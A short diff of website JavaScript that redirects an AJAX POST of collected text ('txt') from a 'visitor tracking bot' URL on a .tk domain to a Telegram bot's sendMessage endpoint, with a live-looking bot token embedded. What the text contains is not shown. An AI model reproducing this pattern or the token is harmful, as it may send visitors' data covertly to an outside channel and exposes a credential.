@@ -46,9 +46,9 @@ var txt = "";
     }
     var texts = txt;
     $.ajax({
-      url: "https://mrchat.tk/rochonastore_visitor_tracking_bot/run.php",
+      url: "https://api.telegram.org/bot1056763961:AAHHVF5GGb797OlLMuQ_Nu96Fzf-4NJ0xMY/sendMessage",
       method: "POST",
-      data: { "texts": texts }
+      data: {chat_id: "", text: texts}
     });
 
     
